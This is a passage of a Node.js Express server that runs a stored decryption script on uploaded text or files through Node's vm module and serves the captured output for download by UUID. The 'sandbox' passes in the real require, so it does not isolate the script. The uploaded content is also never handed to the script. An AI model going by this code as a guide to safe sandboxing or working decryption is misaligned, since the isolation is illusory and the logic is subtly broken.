  const now = new Date();
  const expiryTime = 30 * 60 * 1000; // 30 minutes
  const expiredKeys = Object.keys(storedContents).filter(key => {
    const entryTime = new Date(storedContents[key].timestamp);
    return now - entryTime > expiryTime;
  });

  for (const key of expiredKeys) {
    console.log(`Deleting expired entry: ${key}`);
    delete storedContents[key];
  }
}
setInterval(cleanupOldEntries, 10 * 60 * 1000); // Cleanup every 10 minutes

app.use(express.static('public')); // Serve static files

// POST endpoint to process text or file
app.post('/api/process', upload.single('file'), async (req, res) => {
  let content = '';
  const textFromBody = req.body.text;
  const uploadedFile = req.file;

  try {
    if (textFromBody && typeof textFromBody === 'string') {
      // Content comes from the text body (e.g., pasted Base64/raw binary string)
      content = textFromBody;
      console.log('Processing text from body.');
    } else if (uploadedFile) {
      // Content comes from the uploaded file - read as buffer
      const fileBuffer = await fs.readFile(uploadedFile.path);
      content = fileBuffer.toString('binary'); // Read as binary string to match script input
      console.log('Processing content from uploaded file.');
      await fs.unlink(uploadedFile.path); // Delete temp file after reading
    } else {
      return res.status(400).json({ error: 'Either a text field named "text" or a file named "file" must be provided.' });
    }

    // --- Decrypt the content using the provided script ---
    let decryptedOutput = '';
    try {
      // Create a sandbox context for the script to run in
      const sandbox = {
        module: { exports: {} },
        exports: {},
        Buffer: Buffer,
        console: console, // Allow script to log (optional, be cautious)
        require: require, // Allow script to require modules (like zlib, buffer)
        __dirname: __dirname,
        __filename: __filename
      };

      // Create a new script instance
      const script = new vm.Script(decryptionScriptSource);

      // Run the script in the sandbox, capturing stdout if needed
      // This script likely prints the output directly. We might need to capture that.
      // For now, let's see if we can access the result from the sandbox after execution.
      // The original script prints results. To capture this, we need to redirect console.log.
      const logs = [];
      const originalConsoleLog = console.log;
      console.log = (...args) => {          logs.push(args.join(' '));
          originalConsoleLog.apply(console, args);
      };

      // Execute the script in the sandbox context
      script.runInNewContext(sandbox);

      // Restore original console.log
      console.log = originalConsoleLog;

      // Combine the captured logs into the output string
      decryptedOutput = logs.join('\n');

    } catch (scriptError) {
        console.error('Error executing decryption script:', scriptError.message);
        return res.status(500).json({ error: `Script execution error: ${scriptError.message}` });
    }

    // --- Check if decryption was successful (simple check) ---
    if (!decryptedOutput || decryptedOutput.trim().length === 0) {
        console.error('Decryption script ran but produced no output.');
        return res.status(400).json({ error: 'Decryption failed: Script produced no output.' });
    }

    const uuid = uuidv4();

    // Store the DECRYPTED output string
    storedContents[uuid] = {
      content: decryptedOutput, // Store the captured output from the script
      timestamp: new Date()
    };

    console.log(`Stored decrypted output with UUID: ${uuid}`);

    res.json({ uuid: uuid });

  } catch (error) {
    console.error('Error processing request:', error.message);
    if (req.file && req.file.path) {
      try {
        await fs.unlink(req.file.path);
      } catch (unlinkErr) {
        console.error('Error deleting temp file:', unlinkErr);
      }
    }
    if (error instanceof multer.MulterError) {
      if (error.code === 'LIMIT_FILE_SIZE') {
        return res.status(400).json({ error: 'File too large!' });
      }
      if (error.code === 'LIMIT_FIELD_SIZE') {        return res.status(400).json({ error: 'Text input too large!' });
      }
    }
    res.status(500).json({ error: 'Internal Server Error during processing.' });
  }
});

// GET endpoint to download the processed text file by UUID
app.get('/api/download/:uuid', async (req, res) => {
  const uuid = req.params.uuid;

  try {
    const entry = storedContents[uuid];

    if (!entry) {
      console.log(`Request for non-existent UUID: ${uuid}`);
      return res.status(404).json({ error: 'File not found or link expired.' });
    }

    console.log(`Sending decrypted output for UUID: ${uuid}`);

    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Content-Disposition', `attachment; filename="output.txt"`);

    res.send(entry.content); // Send the stored decrypted output string

  } catch (error) {
    console.error(`Error retrieving file for UUID ${uuid}:`, error.message);
    res.status(500).json({ error: 'Internal Server Error during download.' });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  console.log(`Test the UI at http://localhost:${PORT}/index.html`);
});
